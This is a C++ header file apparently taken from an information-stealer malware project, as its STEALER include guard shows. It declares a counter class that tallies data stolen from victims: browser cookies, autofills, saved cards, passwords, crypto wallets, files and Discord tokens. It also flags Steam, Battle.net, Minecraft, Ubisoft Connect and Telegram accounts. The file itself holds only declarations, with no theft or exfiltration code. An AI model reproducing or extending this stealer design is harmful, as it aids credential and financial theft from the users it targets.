//
// Created by .1qxz on 12.06.2024.
//

#ifndef STEALER_COUNTER_H
#define STEALER_COUNTER_H

#include "Includes.h"
#include <mutex>

class Counter {
public:
    static unsigned long long int getAutoFills();
    static unsigned long long int getBookmarks();
    static unsigned long long int getCookies();
    static unsigned long long int getCards();
    static unsigned long long int getDownloads();
    static unsigned long long int getHistory();
    static unsigned long long int getPasswords();
    static unsigned long long int getCrypto();
    static unsigned long long int getFiles();
    static bool isBattlenet();
    static bool isMinecraft();
    static bool isSteam();
    static bool isUbisoftConnect();
    static bool isTelegram();
    static unsigned long long int getDiscordTokens();
    static void increaseAutoFills();
    static void increaseBookmarks();
    static void increaseCookies();
    static void increaseCards();
    static void increaseDownloads();
    static void increaseHistory();
    static void increasePasswords();
    static void increaseCrypto();
    static void increaseFiles();
    static void setBattlenet();
    static void setMinecraft();
    static void setSteam();
    static void setUbisoftConnect();
    static void setTelegram();
    static void increaseDiscordTokens();

private:
    static unsigned long long autoFills;
    static unsigned long long bookmarks;
    static unsigned long long cookies;
    static unsigned long long cards;
    static unsigned long long downloads;
    static unsigned long long history;
    static unsigned long long passwords;

    static unsigned long long crypto;

    static unsigned long long files;
    static bool battlenet;
    static bool minecraft;
    static bool steam;
    static bool ubisoftConnect;

    static bool telegram;
    static unsigned long long discordTokens;

    static std::mutex mtx;
};

#endif //STEALER_COUNTER_H
